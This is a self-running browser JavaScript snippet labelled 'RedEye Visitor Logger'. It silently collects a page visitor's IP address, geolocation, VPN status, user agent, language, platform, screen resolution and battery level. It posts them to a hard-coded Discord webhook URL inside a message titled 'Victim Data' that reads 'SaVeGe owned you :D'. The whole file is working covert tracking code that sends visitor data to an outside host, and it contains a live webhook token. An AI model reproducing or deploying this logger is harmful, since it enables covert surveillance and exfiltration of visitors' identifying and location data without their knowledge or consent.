(async function () {
	const ipResponse = await fetch("https://ipapi.co/json/?fields=ip,city,region,country_name,security");
	const { ip, city, region, country_name: country, security } = await ipResponse.json();
	const usingVpn = security && typeof security.is_vpn !== "undefined" ? security.is_vpn : false;
	const userAgent = navigator.userAgent;
	const language = navigator.language;
	const platform = navigator.platform;
	const screenResolution = `${screen.width}x${screen.height}`;
	const timestamp = new Date().toISOString();
	let batteryStatus = "";
	if (navigator.getBattery) {
		const battery = await navigator.getBattery();
		const levelPercent = Math.round(battery.level * 100);
		batteryStatus = `${levelPercent}% ${battery.charging ? "(charging)" : ""}`;
	}

	const embed = {
		title: "Victim Data",
		description: "SaVeGe owned you :D",
		color: 16711680,
		fields: [
			{ name: "IP", value: ip, inline: true },
			{ name: "Location", value: `${city}, ${region}, ${country}`, inline: true },
			{ name: "User Agent", value: userAgent, inline: false },
			{ name: "Language", value: language, inline: true },
			{ name: "Platform", value: platform, inline: true },
			{ name: "Screen Resolution", value: screenResolution, inline: true },
			{ name: "Using VPN", value: usingVpn ? "true" : "false", inline: true }
		],
		timestamp: timestamp,
		footer: { text: "RedEye Visitor Logger" }
	};
	if (batteryStatus) {
		embed.fields.push({ name: "Battery", value: batteryStatus, inline: true });
	}

	const payload = {
		embeds: [embed]
	};

	const webhookResponse = await fetch("https://discord.com/api/webhooks/1337819126818934897/IaVq1eU8OafVw2TuLtdqz2K5p-m8PU_juw5p9SLCbnxwmmcjQwa7ZBPicYswl-CH__4H", {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify(payload)
	});
})();
